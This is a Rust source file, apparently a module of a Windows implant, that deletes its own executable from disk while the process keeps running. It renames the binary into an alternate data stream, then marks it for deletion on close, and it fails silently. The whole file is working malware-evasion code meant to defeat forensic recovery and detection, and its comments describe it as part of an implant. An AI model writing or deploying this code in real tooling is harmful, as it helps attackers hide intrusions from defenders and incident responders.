// evasion.rs — Self-deletion via ADS rename + FILE_DISPOSITION_INFO
//
// Removes the implant binary from disk while the process keeps running:
//   1. Opens the current executable with DELETE access
//   2. Renames it to an alternate data stream (:$DATA) so the filename
//      disappears from the directory listing
//   3. Re-opens and marks it for deletion on handle close
//
// Fails silently — if the binary is locked or on a network share the
// implant continues running without a file on disk being a requirement.

use std::ffi::c_void;
use windows::core::PCWSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FileDispositionInfo, FileRenameInfo, SetFileInformationByHandle,
    DELETE, FILE_DISPOSITION_INFO, FILE_FLAGS_AND_ATTRIBUTES, FILE_RENAME_INFO,
    FILE_SHARE_READ, OPEN_EXISTING, SYNCHRONIZE,
};
use windows::Win32::System::Memory::{
    GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY,
};

pub fn evade() {
    unsafe {
        let _ = self_delete();
    }
}

unsafe fn self_delete() -> windows::core::Result<()> {
    // Encode ADS name as wide string
    let stream       = ":$DATA";
    let stream_wide: Vec<u16> = stream.encode_utf16().chain(Some(0)).collect();

    // Get current exe path as wide string
    let exe_path = match std::env::current_exe() {
        Ok(p)  => p,
        Err(_) => return Ok(()),
    };
    let exe_str = match exe_path.to_str() {
        Some(s) => s,
        None    => return Ok(()),
    };
    let full_path: Vec<u16> = exe_str.encode_utf16().chain(Some(0)).collect();

    // Allocate FILE_RENAME_INFO with space for the stream name
    let rename_len  = size_of::<FILE_RENAME_INFO>() + stream_wide.len() * size_of::<u16>();
    let heap        = GetProcessHeap()?;
    let rename_info = HeapAlloc(heap, HEAP_ZERO_MEMORY, rename_len) as *mut FILE_RENAME_INFO;

    (*rename_info).FileNameLength = (stream_wide.len() * size_of::<u16>() - 2) as u32;
    std::ptr::copy_nonoverlapping(
        stream_wide.as_ptr(),
        (*rename_info).FileName.as_mut_ptr(),
        stream_wide.len(),
    );

    // Step 1: rename to ADS
    let h = CreateFileW(
        PCWSTR(full_path.as_ptr()),
        DELETE.0 | SYNCHRONIZE.0,
        FILE_SHARE_READ,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES(0),
        None,
    )?;
    let _ = SetFileInformationByHandle(
        h,
        FileRenameInfo,
        rename_info as *const c_void,
        rename_len as u32,
    );
    let _ = CloseHandle(h);
    let _ = HeapFree(heap, Default::default(), Some(rename_info as *const c_void));

    // Step 2: mark for deletion on close
    let h2 = CreateFileW(
        PCWSTR(full_path.as_ptr()),
        DELETE.0 | SYNCHRONIZE.0,
        FILE_SHARE_READ,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES(0),
        None,
    )?;
    let dispose = FILE_DISPOSITION_INFO { DeleteFile: true.into() };
    let _ = SetFileInformationByHandle(
        h2,
        FileDispositionInfo,
        &dispose as *const FILE_DISPOSITION_INFO as *const c_void,
        size_of_val(&dispose) as u32,
    );
    let _ = CloseHandle(h2);

    Ok(())
}
